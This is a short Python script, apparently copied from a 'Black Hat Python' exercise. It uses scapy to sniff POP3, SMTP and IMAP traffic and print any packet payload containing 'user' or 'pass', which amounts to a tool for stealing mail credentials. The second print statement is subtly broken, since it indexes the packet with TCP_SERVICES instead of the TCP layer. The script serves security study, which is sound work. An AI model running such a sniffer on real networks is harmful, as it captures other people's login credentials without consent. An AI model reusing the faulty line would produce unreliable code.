# Black Hat Python pg 85

from scapy.all import *
from scapy.layers.inet import TCP, IP


def packet_callback(packet):
    if packet[TCP].payload:
        myPacket = str(packet[TCP].payload)
        if 'user' in myPacket.lower() or 'pass' in myPacket.lower():
            print(f"[*] Destination: {packet[IP].dst}")
            print(f"[*] {str(packet[TCP_SERVICES].payload)}")


def main():
    sniff(filter='tcp port 110 or tcp port 25 or tcp port 143',
          prn=packet_callback, store=0)


if __name__ == '__main__':
    main()
